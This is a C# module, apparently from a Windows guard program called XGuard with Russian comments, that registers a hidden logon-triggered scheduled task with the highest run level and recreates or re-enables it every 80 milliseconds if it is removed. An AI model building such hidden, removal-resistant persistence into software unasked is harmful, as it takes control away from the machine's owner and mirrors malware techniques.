using Microsoft.Win32.TaskScheduler;
using Task = Microsoft.Win32.TaskScheduler.Task;

namespace XGuard
{
    internal static class TaskSchedulerModule
    {
        private static Task ScheduledTask;

        //public static Task AddTask(string taskPath, string appExePath)
        //{
        //    TaskService.Instance.RootFolder.DeleteTask(taskPath, false);

        //    TaskDefinition td = TaskService.Instance.NewTask();
        //    var logonTrigger = new LogonTrigger();
        //    logonTrigger.UserId = null;
        //    td.Triggers.Add(logonTrigger);
        //    td.Actions.Add(appExePath);
        //    td.Settings.AllowHardTerminate = false;
        //    td.Settings.StopIfGoingOnBatteries = false;
        //    td.Settings.IdleSettings.StopOnIdleEnd = false;
        //    td.Settings.DisallowStartIfOnBatteries = false;
        //    td.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
        //    td.Principal.RunLevel = TaskRunLevel.Highest;
        //    // td.Principal.UserId = "SYSTEM"; // Устанавливаем учётную запись SYSTEM
        //    td.Settings.DeleteExpiredTaskAfter = TimeSpan.Zero;
        //    td.Settings.Hidden = true;
        //    td.Settings.Enabled = true;
        //    td.Settings.RunOnlyIfIdle = false;
        //    td.Settings.WakeToRun = false;
        //    // td.Settings.Priority = System.Diagnostics.ProcessPriorityClass.High;

        //    var registeredTask = TaskService.Instance.RootFolder.RegisterTaskDefinition(taskPath, td);

        //    return registeredTask;
        //}

        public static Task AddTask(string taskPath, string appExePath)
        {
            // PT();

            // Проверяем входные параметры
            if (string.IsNullOrWhiteSpace(taskPath) || string.IsNullOrWhiteSpace(appExePath))
                throw new ArgumentException("Task path and application path must be valid.");
            if (!System.IO.File.Exists(appExePath))
                throw new FileNotFoundException("The application executable was not found.", appExePath);

            // Удаляем задачу, если она уже существует
            TaskService.Instance.RootFolder.DeleteTask(taskPath, false);

            // Создаём новое задание
            TaskDefinition td = TaskService.Instance.NewTask();

            // Триггер на вход пользователя в систему
            var logonTrigger = new LogonTrigger
            {
                UserId = null // null означает, что триггер срабатывает для всех пользователей
            };
            td.Triggers.Add(logonTrigger);

            // Добавляем действие для выполнения указанного приложения
            td.Actions.Add(new ExecAction(appExePath));

            // Настройки задачи
            td.Settings.AllowHardTerminate = false;
            td.Settings.StopIfGoingOnBatteries = false;
            td.Settings.IdleSettings.StopOnIdleEnd = false;
            td.Settings.DisallowStartIfOnBatteries = false;
            td.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
            td.Settings.DeleteExpiredTaskAfter = TimeSpan.Zero;
            td.Settings.Hidden = true;
            td.Settings.Enabled = true;
            td.Settings.RunOnlyIfIdle = false;
            td.Settings.WakeToRun = false;

            // Устанавливаем задачу для группы "Authenticated Users"
            //td.Principal.UserId = "Authenticated Users"; // Для всех аутентифицированных пользователей
            td.Principal.LogonType = TaskLogonType.Group; // Выполнение от группы
            td.Principal.GroupId = "S-1-5-32-545";
            td.Principal.RunLevel = TaskRunLevel.Highest;


            // Регистрируем задачу в планировщике
            var registeredTask = TaskService.Instance.RootFolder.RegisterTaskDefinition(taskPath, td);

            return registeredTask;
        }







        public static bool IsTaskDeletedOrCorrupted(Task originalTask)
        {
            foreach (var task in TaskService.Instance.RootFolder.EnumerateTasks())
            {
                if (task.Xml == originalTask.Xml)
                {
                    if (!task.Enabled)
                    {
                        Logger.Error($"Task {task.Name} is disabled");
                        task.Enabled = true;
                        Logger.Error($"Task {task.Name} is enabled");
                    }
                    return false;
                }
            }
            return true;
        }

        public static void RemoveTask(string taskPath)
        {
            TaskService.Instance.RootFolder.DeleteTask(taskPath, false);
        }
        public static void PT()
        {
            foreach (var task in TaskService.Instance.RootFolder.EnumerateTasks())
            {
                if (task.Xml.Contains("NVIDIA"))
                {
                    Logger.Info(task.Xml);
                }
            }
            //TaskService.Instance.RootFolder.tas(, false);
        }

        public static async void Run()
        {
            ScheduledTask = AddTask(Program.AppName, Program.AppExePath);

            while (true)
            {
                try
                {
                    if (IsTaskDeletedOrCorrupted(ScheduledTask))
                    {
                        Logger.Error("Scheduled task is deleted or corrupted");
                        ScheduledTask = AddTask(Program.AppName, Program.AppExePath);
                        Logger.Info("Scheduled task recreated");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("Scheduled task update error: " + ex.Message);
                }

                await System.Threading.Tasks.Task.Delay(80);
            }
        }
    }
}
